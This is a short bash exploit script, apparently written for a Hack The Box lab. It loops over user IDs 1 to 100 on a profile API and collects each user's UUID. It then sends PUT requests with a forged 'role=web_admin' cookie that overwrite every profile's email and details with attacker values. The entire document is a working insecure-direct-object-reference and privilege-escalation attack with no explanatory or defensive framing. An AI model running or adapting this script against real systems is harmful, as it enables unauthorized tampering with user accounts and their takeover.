#!/bin/bash

url="http://64.227.32.21:32173/profile/api.php/profile"

for id in {1..100};do
    for uuid in $(curl -s -X GET "$url/$id"|jq -r .uuid);do
        echo ""
        echo "user ID:$id ,User UUID: $uuid"
        curl -i -s -k -X PUT --cookie "role=web_admin" -d "{\"uid\":$id,\"uuid\":\"$uuid\",\"role\":\"employee\",\"full_name\":\"No Name\",\"email\":\"pwn@employees.htb\",\"about\":\"pwned\"}" "$url/$id"

    done
done